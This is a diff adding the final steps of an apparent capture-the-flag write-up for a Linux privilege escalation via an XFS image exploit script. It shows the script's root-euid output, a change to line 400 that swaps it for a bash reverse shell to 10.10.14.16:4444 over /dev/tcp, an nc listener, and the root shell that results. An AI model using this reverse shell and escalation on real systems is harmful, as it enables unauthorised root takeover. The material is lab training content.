@@ -445,3 +445,46 @@ Finally, we want to run exploit.sh, like so:
 ```
 ./exploit.sh -e xfs.img
 ```
+
+#### Output:
+
+```
+=== ROOT SHELL OBTAINED ===
+uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
+```
+
+As can be seen above, the Effective User ID is root.
+
+If we want to get a root shell, however, we must modify exploit.sh, specifically line 400:
+
+```
+"${d}xpl" -p -c 'echo ""; echo "=== ROOT SHELL OBTAINED ==="; id; echo ""; cat /root/root.txt 2>/dev/null; echo ""' 2>/dev/null && exit 0
+```
+
+Change the above to:
+
+```
+"${d}xpl" -p -c 'bash -p -i >& /dev/tcp/10.10.14.16/4444 0>&1 2>&1' 2>/dev/null && exit 0
+```
+
+#### Set up listener:
+
+```
+nc -lvnp 4444
+```
+
+#### Re-run the exploit:
+
+```
+./exploit.sh -e xfs.img
+```
+
+#### Output:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.129.92.38 60670
+bash-4.4# whoami
+whoami
+root
+```
